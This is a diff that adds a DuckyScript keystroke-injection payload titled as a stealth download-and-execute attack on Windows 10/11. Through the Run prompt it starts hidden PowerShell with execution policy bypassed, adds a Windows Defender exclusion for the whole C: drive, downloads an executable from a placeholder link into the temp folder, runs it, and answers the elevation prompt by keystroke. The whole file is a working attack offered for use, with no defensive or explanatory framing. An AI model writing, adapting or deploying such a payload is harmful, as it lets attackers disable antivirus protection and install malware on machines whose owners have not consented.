@@ -1,0 +1,16 @@
+REM Title: Download-Execute .exe from Run Prompt (Stealth Version)
+REM Description: Downloads and executes a .exe script from a Dropbox URL via PowerShell.
+REM Author: Screams (modified)
+REM Target: Windows 10/11
+
+DEFAULT_DELAY 100
+
+REM Open Run Prompt
+GUI r
+DELAY 500
+
+REM Launch hidden PowerShell with elevated privileges
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -C "Start-Sleep 1;cd $env:TEMP;Add-MpPreference -ExclusionPath 'C:\';iwr '=Your File.link' -OutFile 'Main.exe';Start-Sleep 1;Start-Process 'wscript.exe' 'Main.exe';exit"
+CTRL-SHIFT ENTER
+DELAY 3000
+ALT y
